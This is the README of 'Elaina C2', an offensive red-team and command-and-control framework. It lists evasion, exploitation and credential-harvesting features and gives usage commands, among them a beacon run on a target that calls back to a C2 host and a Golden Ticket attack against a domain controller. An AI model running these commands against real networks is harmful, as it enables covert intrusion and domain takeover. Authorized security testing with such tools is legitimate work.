# ⚠️ Disclaimer  
**This is only a weak demo version and will not meet everyone’s expectations.**  
Use it strictly for **educational and authorized penetration testing purposes** only.  

---

# 🌸 Elaina C2 Framework  

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)  
[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)  
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/yuri08loveelaina/elaina-c2)  

Elaina C2 (codename: **Elaina Cute**) is a modular penetration testing and C2 framework that comes with both a command-line interface (CLI) and a graphical user interface (GUI).  
It is designed to assist security professionals in **Active Directory assessments, red team operations, and advanced post-exploitation scenarios**.  

---

## ✨ Key Features  

### 🎯 Attacks & Exploitation  
- Active Directory Certificate Services (**ADCS**) exploitation  
- **Kerberos Golden Ticket** generation  
- **NTLM Relay** attacks  
- Web exploitation: SQL Injection, SSRF, LFI, XXE, IDOR  
- **Redis RCE**  

### 🕵️ Evasion Capabilities  
- Anti-debugging & Anti-VM checks  
- AMSI & ETW bypass  
- Adaptive traffic shaping  
- Random domain generation for obfuscation  

### 🖥️ Graphical User Interface (GUI)  
- Real-time dashboard  
- Beacon & attack management  
- Remote file/system interaction  
- Built-in script editor & browser  

### 📡 Command & Control (C2)  
- Protocols: HTTP(S), DNS, TCP, SMB  
- Encrypted communication  
- Smart Beaconing  
- **Silver C2** with advanced stealth  

### 🔍 Information Gathering  
- Credential harvesting  
- Network mapping & system inventory  
- Remote screenshotting  
- File upload/download  

---

## ⚙️ System Requirements  
- **Python** 3.8+  
- **OS**: Windows, Linux, macOS  
- **RAM**: Minimum 4GB (8GB+ recommended)  
- **Disk Space**: 500MB+  

---

## 🚀 Installation  

- Clone the repository and install dependencies:  
```bash
git clone https://github.com/yuri08loveelaina/elaina-c2.git
cd elaina-c2
pip install -r requirements.txt
```
- Install Dependencies
```
pip install PyQt5 selenium requests beautifulsoup4 colorama \
            undetected-chromedriver selenium-wire impacket \
            stem cryptography cloudscraper certipy
```
## 🖥️ Usage  

- Launch GUI
```
python elaina-cute.py --gui
```

- Or simply run without arguments
```
python elaina-cute.py
```

 ##Command-Line Examples

- Web scan
```
python elaina-cute.py https://example.com
```

- With TOR
```
python elaina-cute.py https://example.com --tor
```

- LDAP subnet scan
```
python elaina-cute.py https://example.com --ldap-subnet 10.0.0.0/24
```

- With Burp Suite
```
python elaina-cute.py https://example.com --burp
```

- Start C2 Server (HTTP)
```
python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8080
```

- Start C2 Server (HTTPS)
```
python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8443 \
  --c2-ssl --c2-cert /path/to/cert.pem --c2-key /path/to/key.pem
```

- Golden Ticket Generation
```
python elaina-cute.py --golden-ticket \
  --gt-domain EXAMPLE.COM --gt-user administrator \
  --gt-krbtgt-hash <hash> --gt-sid <sid>
```

- Complete AD Assessment
```
python elaina-cute.py https://internal.example.com \
  --ldap-subnet 10.0.0.0/24 --winrm-user admin --winrm-pass password
```

- C2 Infrastructure Setup

- Terminal 1: Start C2 Server 
```
python elaina-cute.py --c2-server --c2-host 0.0.0.0 --c2-port 8443 \
  --c2-ssl --c2-cert /path/to/cert.pem --c2-key /path/to/key.pem
```

- Terminal 2: Start Beacon on target
```
python elaina-cute.py --c2-beacon --c2-beacon-host example.com \
  --c2-beacon-port 8443 --c2-beacon-ssl
```

- Golden Ticket Attack
```
python elaina-cute.py --golden-ticket \
  --gt-domain EXAMPLE.COM --gt-user administrator \
  --gt-krbtgt-hash aad3b435b51404eeaad3b435b51404ee:... \
  --gt-sid S-1-5-21-... --gt-target dc01.example.com \
  --gt-command "whoami"
```
## 📚 Documentation  

### Command Line Options  

| Option         | Description                               |
|----------------|-------------------------------------------|
| `--gui`        | Launch GUI interface                      |
| `--tor`        | Route traffic through TOR                 |
| `--tor-pass`   | TOR control password (default: yuriontop) |
| `--burp`       | Forward requests to Burp Repeater API     |
| `--ldap-subnet`| Scan subnet via LDAP                      |
| `--winrm-user` | WinRM username                            |
| `--winrm-pass` | WinRM password                            |
| `--pfx-path`   | Path to .pfx certificate                  |
| `--pfx-password`| Password for .pfx certificate            |
| `--golden-ticket`| Generate Kerberos Golden Ticket         |
| `--c2-server`  | Start C2 server                           |
| `--c2-beacon`  | Start C2 beacon                           |
| `--silver-c2`  | Start Silver C2 beacon                    |
## 🏗️ Architecture  

Core Engine – exploitation & post-exploitation  
C2 Framework – beacon management & communications  
GUI – PyQt5-based dashboard  
CLI – automation & scripting interface  
Encryption Module – secure comms  
Evasion Module – stealth & defense bypass  

## 📜 License  

This project is licensed under the MIT License – see the LICENSE file.  

## ⚠️ Disclaimer  

This tool is for educational and authorized security testing only.  
The authors are not responsible for any misuse.  

## 🙏 Acknowledgments  

Impacket Project – networking backbone  
PyQt5 Team – GUI framework  
Security researchers for techniques & inspiration  
All contributors ❤️  


